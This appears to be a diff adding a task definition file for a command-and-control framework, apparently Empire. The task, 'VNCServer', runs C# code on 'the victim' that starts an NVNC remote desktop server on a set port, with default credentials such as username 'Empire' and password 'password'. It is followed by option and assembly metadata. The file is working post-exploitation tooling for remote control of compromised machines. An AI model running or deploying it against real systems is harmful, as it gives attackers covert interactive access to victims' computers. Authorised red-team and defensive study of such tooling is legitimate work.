@@ -1,0 +1,137 @@
+- Name: VNCServer
+  Aliases: []
+  Description: |
+    Installs and runs a C# VNC server on the victim.
+  Author: 
+      Name: Jake Krasnov
+      Handle: _Hubbl3
+      Link: https://twitter.com/_Hubbl3
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: |
+    using System;
+    using System.Drawing;
+
+    using NVNC;
+
+    public static class Task
+    {
+        public static void Execute(string Password, string Port, string Username)
+        {
+            int port = Int32.Parse(Port);
+            VncServer s = new VncServer(Password, port, Username);
+            try
+            {
+                  s.Start();
+                  Console.WriteLine("VNC server terminated");
+            }
+            catch (ArgumentNullException ex)
+            {
+                  Console.WriteLine(ex.Message);
+                  return;
+            }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: true
+  TokenTask: false
+  Options:
+  - Name: Password
+    Value: password
+    DefaultValue: ''
+    Description: Password for the VNC server.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Port
+    Value: 5900
+    DefaultValue: ''
+    Description: Port the VNC server will listen on.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Username
+    Value: Empire
+    DefaultValue: ''
+    Description: Username for the VNC server.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: NVNC
+    Description: NVNC is a C# library implmenting a VNC Server.
+    Location: NVNC\
+    Language: CSharp
+    CompatibleDotNetVersions: 
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.Drawing.dll
+      Location: net40\System.Drawing.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40\System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.Drawing.dll
+      Location: net35\System.Drawing.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35\System.Windows.Forms.dll
+      DotNetVersion: Net35
+    EmbeddedResources: []
+  ReferenceAssemblies:
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.Drawing.dll
+      Location: net40\System.Drawing.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40\System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.Drawing.dll
+      Location: net35\System.Drawing.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35\System.Windows.Forms.dll
+      DotNetVersion: Net35
+  EmbeddedResources: []
